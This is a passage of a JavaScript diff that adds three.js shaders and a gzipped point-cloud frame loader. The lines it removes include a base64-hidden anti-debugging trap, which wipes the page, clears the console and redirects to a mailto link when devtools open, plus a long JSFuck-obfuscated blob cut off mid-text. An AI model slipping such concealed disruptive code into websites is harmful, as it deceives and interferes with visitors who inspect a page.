+    leave: { opacity: 0, position: 'absolute', transform: 'translate3d(-100px,-50%,0)' },
+    keys: item => item.key,
+  });
+  return React.createElement('div', { className: 'TitleContainer' },
+    React.createElement('div', { className: 'TitleHome' },
+      React.createElement('div', { key: current },
+        transitions((style, item) => React.createElement(animated.div, { style }, item.text)),
+      )));
+}
+const Title = injectIntl(TitleBase);
+*/
+
+/* ================= Shaders ================= */
+const edgeShader = {
+  transparent: true,
+  depthTest: false,
+  depthWrite: false,
+  uniforms: {
+    opacity: { value: 0.0 }, // wird pro Step gesetzt
+    width: { value: edgeClipFromPx(EDGE_PX_EMPH) }, // wird pro Frame aus state.edgeWidthPx gespiegelt
+    resolution: { value: new THREE.Vector2(1920, 1080) }
+  },
+  vertexShader: `
+      precision highp float; uniform vec2 resolution; uniform float width;
+      attribute vec3 instanceFrom,instanceTo;
+      void main(){
+        // Y "fix" auf 1080 -> width verhält sich pixelähnlich über verschiedene Viewports
+        vec2 r=vec2(resolution.x,1080.0);
+        float aspect=r.x/r.y;
+        vec4 s=projectionMatrix*(modelViewMatrix*vec4(instanceFrom,1.0));
+        vec4 e=projectionMatrix*(modelViewMatrix*vec4(instanceTo,1.0));
+        vec2 ns=s.xy/s.w, ne=e.xy/e.w, dir=ne-ns; dir.x*=aspect; dir=normalize(dir);
+        vec2 off=vec2(dir.y,-dir.x); dir.x/=aspect; off.x/=aspect;
+        if(position.x<0.0) off*=-1.0;
+        if(position.y<0.0) off+=-dir; else if(position.y>1.0) off+=dir;
+        off*=width; vec4 clip=(position.y<0.5)?s:e; clip.xy+=off; gl_Position=clip;
+      }`,
+  fragmentShader: `precision highp float; uniform float opacity; void main(){ gl_FragColor=vec4(1.0,1.0,1.0,opacity); }`,
+};
+const nodeShader = {
+  transparent: true,
+  depthTest: true,
+  depthWrite: true,
+  uniforms: { paillette: { value: 0 } },
+  vertexShader: `
+      precision highp float; uniform float paillette;
+      attribute vec3 instancePosition,instanceColor; attribute float instanceScale,instanceOpacity;
+      varying vec3 vColor; varying float vOpacity;
+      void main(){
+        vec4 mv=modelViewMatrix*vec4(instancePosition,1.0);
+        mv.xyz+=position*instanceScale; gl_Position=projectionMatrix*mv;
+        vColor=instanceColor+(vec3(1.0)*(cos(instanceOpacity+paillette)*0.1));
+        vOpacity=(instanceOpacity==1.0)?(0.8+cos(instanceOpacity+paillette)*0.2):instanceOpacity;
+      }`,
+  fragmentShader: `precision highp float; varying vec3 vColor; varying float vOpacity; void main(){ gl_FragColor=vec4(vColor,vOpacity); }`,
+};
+
+/* ================= Load data + global centering ================= */
+/* ---------- robust loader: multi-frame + append single-frame ---------- */
+async function loadFramesAndLinks() {
+  // small helper that returns null on failure (404/network/etc.)
+  async function safeLoadGZJSON(url) {
+    try {
+      const r = await fetch(url);
+      if (!r.ok) return null;
+      const a = await r.arrayBuffer();
+      return JSON.parse(ungzip(new Uint8Array(a), { to: 'string' }));
+    } catch (_) {
+      console.warn(_.message, url)
+      return null;
+    }
   }
 
-  function _grd (x, y, g) {
-    const t = 0.5 - x * x - y * y
-    if (t < 0) return 0
-    return t * t * t * (grd[ g ][ 0 ] * x + grd[ g ][ 1 ] * y)
+  const frames = [];
+
+  /* 1) Load the original multi-frame capture (if available) */
+  const pts = await safeLoadGZJSON('./points_w_ratio.json.gz');
+  if (Array.isArray(pts) && pts.length) {
+    // (legacy mobile tweak kept exactly as before)
+    if ((innerWidth || innerHeight) <= 600 && pts[5] && pts[5][0]) {
+      const A = Array.isArray(pts[5][0]) ? pts[5][0] : Object.values(pts[5][0]);
+      for (let i = 0; i < A.length; i += 3) {
+        const x = A[i];
+        A[i] = A[i + 1] * 0.6;
+        A[i + 1] = -x * 0.6;
+      }
+      pts[5][0] = A;
+    }
+    for (const d of pts) {
+      const p = new Float32Array(Array.isArray(d[0]) ? d[0] : Object.values(d[0]));
+      const c = new Float32Array(Array.isArray(d[1]) ? d[1] : Object.values(d[1]));
+      // guard: if colors missing/mismatched, fill white
+      const col = (c.length === p.length) ? c : new Float32Array(p.length).fill(1);
+      frames.push([p, col]);
+    }
   }
 
-  window.addEventListener('resize', function () {
-    c.width = w = window.outerWidth
-    c.height = h = window.outerHeight
-    v ? v.attributes.viewBox.value = `0 0 ${w} ${h}` : noop()
-  }, false)
-
-  if(!sDisplay) {
-    document.addEventListener('pointerdown', () => {z = 9000;mTrace = false}, false)
-    document.addEventListener('pointerup', () => {z = 0;mTrace = true}, false)
+  /* 2) Load your single-frame and APPEND it as the last frame (if present) */
+  const single = await safeLoadGZJSON('./vaeora.json.gz');
+  if (single && Array.isArray(single) && single.length === 2 &&
+    Array.isArray(single[0]) && Array.isArray(single[1]) &&
+    single[0].length === single[1].length && (single[0].length % 3 === 0)) {
+    const p = new Float32Array(single[0]);
+    const c = new Float32Array(single[1]);
+    frames.push([p, c]); // <- APPEND to the end
   }
 
-  document.addEventListener('pointermove', onmousemove, {passive: true});
+  if (!frames.length) {
+    throw new Error('No frame data found (points_w_ratio.json.gz or vaeora.json.gz).');
+  }
 
-  run();
-}();
+  /* 3) Global centering across ALL frames (keeps everything aligned) */
+  let minX = Infinity,
+    maxX = -Infinity,
+    minY = Infinity,
+    maxY = -Infinity;
+  for (const [p] of frames) {
+    for (let i = 0; i < p.length; i += 3) {
+      const x = p[i],
+        y = p[i + 1];
+      if (x < minX) minX = x;
+      if (x > maxX) maxX = x;
+      if (y < minY) minY = y;
+      if (y > maxY) maxY = y;
+    }
+  }
+  const cx = (minX + maxX) / 2,
+    cy = (minY + maxY) / 2;
 
-const x = 'bGV0IGRtZXNnPSgpPT4oKCk9PihyZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCk9PntpZihkb2N1bWVudC5ib2R5LmlkPSIiK0RhdGUubm93KCksZXZhbCgiZGVidWdnZXIiKSw1MDA8RGF0ZS5ub3coKS1wYXJzZUludChkb2N1bWVudC5ib2R5LmlkKSl7ZG1lc2c9KCk9Pnt9LE9iamVjdChjb25zb2xlKS5jbGVhcigpO2xldCBuZXdXaW49d2luZG93Lm9wZW4oIl9ibGFuayIpO251bGw9PT1uZXdXaW4mJihuZXdXaW49d2luZG93KSxbZG9jdW1lbnQuYm9keV0uZm9yRWFjaChlPT5lLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoZSkpLG5ld1dpbi5kb2N1bWVudC50aXRsZT0iWU9VJ1JFIE5BVUdIVFkiLG5ld1dpbi5sb2NhdGlvbi5ocmVmPSJtYWlsdG86bWFpbEBhbmRyZWZlaWdlbmJ1dHouY29tP1N1YmplY3Q9SGV5Li4uIn1zZXRUaW1lb3V0KCgpPT5kbWVzZz1kbWVzZygpLDE1MDApfSksZG1lc2cpKSgpO2RtZXNnKCksWy4uLmRvY3VtZW50LnNjcmlwdHNdLmZvckVhY2goZT0+ZS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGUpKTs=';
-[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[!+[]+!+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[